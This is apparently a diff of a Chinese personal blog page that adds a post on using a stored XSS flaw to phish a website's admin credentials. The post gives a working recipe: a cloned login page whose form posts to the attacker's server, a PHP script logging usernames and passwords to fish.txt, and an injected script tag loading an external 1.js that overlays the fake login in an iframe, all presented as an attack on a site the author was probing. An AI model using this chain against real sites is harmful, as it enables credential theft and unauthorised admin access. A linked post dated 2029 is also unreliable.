@@ -6,8 +6,6 @@
 
 
 
-  
-
 
 
 
@@ -22,7 +20,7 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
   <meta name="renderer" content="webkit">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, shrink-to-fit=no" , user-scalable="no"">
-  <title>Category: 法律乔巴Doctor</title>
+  <title>XSS钓鱼获取后台账号密码乔巴Doctor</title>
   <link rel="shortcut icon" href>
   
     
@@ -108,59 +106,191 @@
                 </nav>
             </header>
                 
-<header class="blog-post-page-title blog-search-page-title">
-  <h4>分类<a href>法律</a>下的文章</h4>
+<header class="blog-post-page-title">
+    <h4>XSS钓鱼获取后台账号密码</h4>
+    <time datetime="2019-06-11T13:28:23.000Z"><i class="fa fa-clock-o"></i>2019-06-11</time>
+    
+    
+    
+    
+	
+        <span><i class="fa fa-folder-o"></i>
+    		
+    	       <a href="/categories/技术/" rel="categories" data-toggle="tooltip" data-placement="top" title="Linux">技术</a>
+    		
+        </span>
+	
+    
 </header>
 <div class="blog-main-post blog-post-page-box">
-  
-    <article class="blog-post-block">
+    <article class="blog-post-block blog-post-page-content">
+        <section>
+            
+                <center><strong>XSS钓鱼获取后台账号密码</strong></center>
+
+<p><strong>XSS钓鱼获取后台账号密码</strong><br>前几天在测试某个网站的时候，发现存在存储型跨站脚本漏洞，但是cookie被设置了http-only属性，导致无法获取到cookie的内容，有用的信息只是能够知道后台的地址，重要的cookie被保护起来了，获得的信息并没有Sessionid，也没有授权key,更没有账号和密码，于是把思路转向钓鱼，访问后台，查看源代码。<br>使用钓鱼的方式获取网站后台账号密码<br><strong>伪造后台登录界面</strong><br>查看后台源代码，在本地保存为html文件，并且整理网站链接的路径，将原来的相对路径补充为完整的绝对路径（注意，网站的绝对路径需要是目标网站的域名）：<br><img src="./1.jpg" alt="图片"><br>这样，我们就在本地伪造了一个一模一样的后台登录界面。<br>修改源代码中的POST数据包的提交地址<br>伪造好后台页面之后，还需要数据包的提交地址。找到源代码中的form表单，修改action选项的值为我们自己服务器的页面地址，这个页面用来接收管理员提交的账号密码。<br><img src="./2.jpg" alt="图片"><br><strong>编写账号密码接收页面</strong><br>&lt;?php<br>    $a = $_POST[‘userName’];<br>    $b = $_POST[‘password’];<br>    $file = fopen(“fish.txt”,”a+”);<br>    fwrite($file,$a);<br>    fwrite($file,’  ‘);<br>    fwrite($file,$b);<br>    fwrite($file,’  ‘);<br>    fclose($file);<br>    header(‘Location: <a href="http://xxx/main&#39;)" target="_blank" rel="noopener">http://xxx/main&#39;)</a>;<br>?&gt;<br>该段代码会接收POST参数userName和password（注意，这样个参数的名字需要从后台页面的表单中获得），并且将接收到的内容以追加的方式写入到当前目录中的fish.txt文件中，同时，将页面定位到<br><a href="http://xxx/main" target="_blank" rel="noopener">http://xxx/main</a><br>这样做是为了，在调取管理员的账号密码之后，将管理员重定向到他自己网站的后台(因为管理员之前已经登录过自己的后台，重新定向到原网站的登录页面，会直接进入到后台首页)。<br>构建XSS语句<br><strong>构建如下语句：</strong></p>
+<p>&lt;script src=<a href="http://www.xxx.com/xxx/1.js&gt;" target="_blank" rel="noopener">http://www.xxx.com/xxx/1.js&gt;</a><br>将语句插入到之前能够打XSS的地方。(如果链接太长，可以使用短链接生成器将链接缩短)<br><strong>1.js内容如下：</strong><br>document.body.innerHTML=(‘<div style="width:100%;height:100%">&lt;iframe src=<a href="http://www.xxx.com/xxx/main.html" target="_blank" rel="noopener">http://www.xxx.com/xxx/main.html</a> width=100% height=1000px scrolling=no frameborder=0&gt;</div>‘);<br>iframe元素会创建包含另外一个文档的内联框架，也就是说如果我们在网页中添加了一个iframe元素，src一个需要内联的网址，然后src的网页就会加载在当前网站，这样当我们的xss代码被触发的时候，网站就会内嵌一个我们伪造的一毛一样的钓鱼页面在管理员的浏览器上，管理员可能就以为自己退出了系统，然后重新输入用户名和密码，这样密码就会发送到我们的服务器上，我们就可以利用用户名和密码进行登录了，然后就可以进入后台为所欲为了。</p>
+
+            
+        </section>
+        <footer class="blog-post-page-tags">
         
-        <div class="blog-post-block-padding">
-          
-            <a href="/2029/01/01/中华人民共和国网络安全法/">中华人民共和国网络安全法</a>
-          
-            <section>
-              
-                
-                心中常挂国旗
-
-请大家做个遵纪守法的好公民
-
-
-	
-    
-	
-
-
-
-中华人民共和国网络安全法.pdf
-
-                ...
-              
-            </section>
-            <footer>
-                <time datetime="2028-12-31T16:00:00.000Z><i class=" fa fa-clock-o">2029-01-01</time>
-                
-                
-                 
-                
-                  <span><i class="fa fa-folder-o"></i>
-                    
-                      <a href="/categories/法律/" itemprop="url" rel="index">
-                        法律
-                      </a>
-                    
-                  </span>
-                
-            </footer>
-        </div>
+			
+				
+			<a href="/tags/xss/" rel="tag" data-toggle="tooltip" data-placement="top" title="Linux">xss</a>
+				
+			
+		
+        </footer>
     </article>
-  
-    
-    <nav id="pagination" class="blog-pagination">
-            <span class="page-number current">1</span>
-    </nav>
+    <article class="blog-post-page-readmore">
+    	
+    	
+		
+			<a href="/2029/01/01/中华人民共和国网络安全法/" class="blog-post-page-readmore-prev" data-toggle="tooltip" data-placement="top" title="中华人民共和国网络安全法">上一篇</a>
+		
 
+		
+		
+			<a href="/2019/06/07/Excel处理脚本/" class="blog-post-page-readmore-next" data-toggle="tooltip" data-placement="top" title="Excel处理脚本">下一篇</a>
+		
+
+        <div style="clear: both;"></div>
+    </article>
+
+    <article class="blog-post-block blog-post-page-content">
+            <div class="row">
+            
+                <div class="col-md-4 col-sm-4 post-page-more-btn">
+                    <span class="post-comments-btn btn btn-info btn-block" data-toggle="tooltip" data-placement="top" title="本站采用Disqus评论组件，若您没有科学上网可能会无法查看并评论">加载评论</span>
+                </div>
+            
+                <div class="col-md-4 col-sm-4 post-page-more-btn">
+                    <span data-toggle="modal" data-target="#post-donate-content">
+                        <span id="post-donate-btn" class="btn btn-danger btn-block" data-toggle="tooltip" data-placement="top" title="如果您觉得本文还不错或者对您有帮助，可以考虑打赏一下作者哦">打赏本文</span>
+                    </span>
+                </div>
+                <div class="col-md-4 col-sm-4 post-page-more-btn">
+                    <span data-toggle="modal" data-target="#post-qrcode-content">
+                        <span><span id="post-qrcode-btn" class="btn btn-success btn-block" data-toggle="tooltip" data-placement="top" title="微信扫描二维码手机端查看本文及分享本文">二维码</span></span>
+                    </span>
+                </div>
+            </div>
+        <div class="post-more-function-br"></div>
+
+        <div class="modal fade" id="post-donate-content" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+            <div class="modal-dialog" role="document">
+                <div class="modal-content">
+                    <div class="modal-header">
+                        <h5 class="modal-title" id="exampleModalLabel">打赏本文</h5>
+                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                            <span aria-hidden="true">&times;</span>
+                        </button>
+                    </div>
+                    <div class="modal-body">
+                        <div class="row post-donate-content">
+                            <div class="col-md-4">
+                                <p>支付宝</p>
+                                <img class="post-donate-content-img no-lightbox" src>
+                            </div>
+                            <div class="col-md-4">
+                                <p>微信</p>
+                                <img class="post-donate-content-img no-lightbox" src>
+                            </div>
+                            <div class="col-md-4">
+                                <p>财付通</p>
+                                <img class="post-donate-content-img no-lightbox" src>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="modal-footer">
+                        <button type="button" class="btn btn-secondary" data-dismiss="modal">关闭</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="modal fade" id="post-qrcode-content" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+            <div class="modal-dialog modal-sm" role="document">
+                <div class="modal-content">
+                    <div class="modal-header">
+                        <h5 class="modal-title" id="exampleModalLabel">文章二维码</h5>
+                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                            <span aria-hidden="true">&times;</span>
+                        </button>
+                    </div>
+                    <div class="modal-body">
+                        <div class="row post-qrcode-content">
+                            <span class="post-qrcode-content-canvas"></span>
+                            <img class="post-qrcode-content-img no-lightbox" src>
+                        </div>
+                    </div>
+                    <div class="modal-footer">
+                        <button type="button" class="btn btn-secondary" data-dismiss="modal">关闭</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <script>
+            // post QRcode
+            // 中文转码
+            function toUtf8(str) {
+                var out, i, len, c;
+                out = "";
+                len = str.length;
+                for (i = 0; i < len; i++) {
+                    c = str.charCodeAt(i);
+                    if ((c >= 0x0001) && (c <= 0x007F)) {
+                        out += str.charAt(i);
+                    } else if (c > 0x07FF) {
+                        out += String.fromCharCode(0xE0 | ((c >> 12) & 0x0F));
+                        out += String.fromCharCode(0x80 | ((c >> 6) & 0x3F));
+                        out += String.fromCharCode(0x80 | ((c >> 0) & 0x3F));
+                    } else {
+                        out += String.fromCharCode(0xC0 | ((c >> 6) & 0x1F));
+                        out += String.fromCharCode(0x80 | ((c >> 0) & 0x3F));
+                    }
+                }
+                return out;
+            }
+            // 生成
+            var qrcode= $('.post-qrcode-content-canvas').qrcode({width: 150,height: 150,text: toUtf8("http://meetdoctor.github.io/2019/06/11/XSS钓鱼获取后台账号密码/")}).hide();
+            var canvas=qrcode.find('canvas').get(0);
+            $('.post-qrcode-content-img').attr('src',canvas.toDataURL('image/jpg'));
+        </script>
+
+        
+        
+            <div id="disqus_thread"></div>
+            <script data-no-instant>
+                $(document).ready(function() {
+                    $('.post-comments-btn').on('click', function(){
+                        var disqus_shortname = 'meetdoctor';
+                        $.ajax({
+                            type: "GET",
+                            url: "https://" + disqus_shortname + ".disqus.com/embed.js",
+                            dataType: "script",
+                            cache: true
+                        });
+                        $('.post-more-function-br').css('height','.6em');
+                    });
+                });
+                var reset = function (newIdentifier, newUrl, newTitle, newLanguage) {
+                    DISQUS.reset({
+                        reload: true,
+                        config: function () {
+                            this.page.identifier = newIdentifier;
+                            this.page.url = newUrl;
+                            this.page.title = newTitle;
+                            this.language = newLanguage;
+                        }
+                    });
+                };
+            </script>
+            
+    </article>
+    
 </div>
 
                 
